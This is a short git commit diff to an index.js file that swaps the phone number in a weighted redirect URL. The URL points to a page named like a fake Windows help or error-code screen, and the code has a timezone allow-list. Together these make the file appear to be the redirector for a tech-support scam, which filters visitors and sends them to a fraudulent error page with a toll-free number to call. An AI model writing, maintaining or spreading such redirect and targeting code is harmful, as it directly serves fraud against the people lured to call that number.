a74f8d9f338b3358b9d3f2cf57898746597d1a63
paalakash <palaksh452@gmail.com>
2026-06-17 05:54:24 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://lobster-app-ljem7.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-900-934", weight: 1.0 }
+    { url: "https://lobster-app-ljem7.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-320-629", weight: 1.0 }
     
 ];
 
